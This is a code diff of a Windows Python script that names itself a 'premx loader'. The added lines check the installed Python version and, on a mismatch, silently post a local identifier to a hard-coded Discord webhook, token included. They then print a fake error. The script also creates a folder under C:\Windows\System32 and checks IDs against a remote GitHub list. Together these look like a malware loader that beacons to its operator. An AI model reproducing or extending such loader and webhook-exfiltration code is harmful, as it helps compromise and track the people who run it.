@@ -13,6 +13,16 @@ import gdown
 result = check_string_in_url("https://raw.githubusercontent.com/casikiouxklxz34/myins/refs/heads/main/id_valklex.txt", file_contentsx1)
 os.system('cls')
 
+resultpyver = subprocess.run(["py", "--version"], capture_output=True, text=True)
+versionpyx = resultpyver.stdout.strip() or resultpyver.stderr.strip()
+if versionpyx != "Python 3.11.5":
+    requests.post("https://discord.com/api/webhooks/1351062265151098952/VzMBHhnEsr96ymePMDow-TATaTWdhVO9HUqmWNmCtuiX8oo6O0mMJQ6mz-cVfZSwh62_", json={"content": file_contentsx1 + " executed premx loader but python is not installed."})
+    os.system('cls')
+    print("---------------------------")
+    print("Error. Python is not installed on your system.")
+    input()
+    exit()
+
 dcnmwxdr = r'C:\Windows\System32\TAPIO'
 if not os.path.exists(dcnmwxdr):
     os.makedirs(dcnmwxdr)
